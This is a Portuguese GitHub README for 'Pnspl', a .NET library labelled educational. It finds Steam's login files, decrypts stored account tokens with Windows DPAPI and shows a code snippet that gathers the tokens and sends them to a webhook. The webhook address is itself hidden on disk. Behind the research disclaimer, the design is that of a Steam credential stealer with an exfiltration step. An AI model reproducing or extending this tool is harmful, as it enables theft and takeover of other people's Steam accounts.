# Pnspl - Steam VDF Library & Console App

> **Conteúdo Educativo** - Biblioteca .NET para leitura de arquivos VDF do Steam e decriptação de tokens, com aplicação console de demonstração.

[![C#](https://img.shields.io/badge/C%23-10-239120?style=flat-square&logo=csharp&logoColor=white)](#)
[![.NET](https://img.shields.io/badge/.NET-Framework-512BD4?style=flat-square&logo=dotnet&logoColor=white)](#)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](#)

## Sobre o Projeto

O **Pnspl** é um conjunto de projetos .NET que demonstram como interagir com arquivos de configuração do Steam, incluindo parsing VDF, decriptação de tokens via DPAPI e armazenamento seguro de credenciais.

### Objetivo Educativo

- Estudar o formato VDF (Valve Data Formate)
- Entender o sistema de autenticação do Steam
- Analisar o uso de DPAPI para proteção de dados
- Compreender padrões de bibliotecas C#

### ⚠️ Aviso Importante

> Este projeto é exclusivamente para fins educacionais e de pesquisa em segurança. O código aqui presente NÃO deve ser utilizado para atividades ilegais.

## Componentes

### 1. ClassLibrary1 (SteamVdfLib)

Biblioteca reutilizável com funcionalidades principais:

| Classe | Descrição |
|--------|-----------|
| `SteamReader` | Lê e decripta tokens Steam |
| `VdfParser` | Parser completo para arquivos VDF |
| `SteamTokenDecryptor` | Decriptação via DPAPI |
| `SecretStore` | Armazenamento seguro com DPAPI |
| `Crypto` | Criptografia AES |

#### Uso da Biblioteca

```csharp
// Obter tokens Steam
var tokens = SteamVdfLib.GetTokens();

// Enviar resumo via webhook
await SteamVdfLib.SendSummaryAsync(tokens);
```

#### Armazenamento Seguro

```csharp
// Proteger webhook com DPAPI
SecretStore.ProtectWebhookToFile(webhookUrl, "webhook.prot");

// Recuperar webhook protegido
string webhook = SecretStore.GetProtectedWebhookFromFile("webhook.prot");
```

### 2. ConsoleApp1

Aplicação console para demonstração:

```bash
# Executa e mostra todas as contas Steam encontradas
# Exibe: SteamID, AccountName, Token (se disponível)
```

## Arquitetura

```
Pnspl/
├── ClassLibrary1/                    # Biblioteca SteamVdfLib
│   └── ClassLibrary1/
│       ├── Class1.cs                 # Código principal (456 lines)
│       └── ClassLibrary1.csproj
│
├── ConsoleApp1/                      # App de demonstração
│   └── ConsoleApp1/
│       ├── Program.cs
│       └── ConsoleApp1.csproj
│
└── README.md                         # Esta documentação
```

## Tecnologias

| Tecnologia | Uso |
|------------|-----|
| C# / .NET | Linguagem principal |
| Windows Registry | Localização do Steam |
| DPAPI | Proteção/Decriptação de tokens |
| CRC32 | Geração de chaves de cache |
| AES | Criptografia simétrica |
| HttpClient | Webhooks |

## Conceitos Estudados

### Valve Data Format (VDF)
- Formato de configuração do Steam
- Estrutura hierárquica com chaves/valores
- Arquivos: `loginusers.vdf`, `local.vdf`

### DPAPI (Data Protection API)
- `CryptProtectData` - Proteger dados
- `CryptUnprotectData` - Decriptar dados
- Entropy por conta (nome do usuário)
- Vinculação ao usuário do Windows

### CRC32
- checksum de 32 bits
- Usado para gerar chaves de cache
- Polynomial: 0xEDB88320

### Padrões de Design
- Biblioteca reutilizável (DLL)
- Separação de responsabilidades
- Tratamento de erros

## Como Compilar

```bash
# Requer Visual Studio com .NET Desktop Development
# Abra a solução e compile cada projeto individualmente
```

## Fluxo de Dados

```
┌──────────────┐
│   Registry   │
│ (SteamPath)  │
└──────┬───────┘
       │
┌──────┴───────┐
│  loginusers  │──→ VdfParser ──→ SteamID + AccountName
│     .vdf     │
└──────────────┘
       │
┌──────┴───────┐
│   local.vdf  │──→ FindConnectCache ──→ Token Encriptado
└──────────────┘
       │
┌──────┴───────┐
│  CRC32(Name) │──→ CacheKey
└──────────────┘
       │
┌──────┴───────┐
│  DPAPI Decrypt│──→ Token Desencriptado
└──────────────┘
```

## Autor

**Rafael Melinsky** - Pesquisador de Segurança

- GitHub: [@melinskyRf](https://github.com/melinskyRf)
- Site: [devmelinsky.site](https://devmelinsky.site)

---

> 📚 **Conteúdo Educativo** - Para aprender sobre bibliotecas .NET e autenticação Steam.
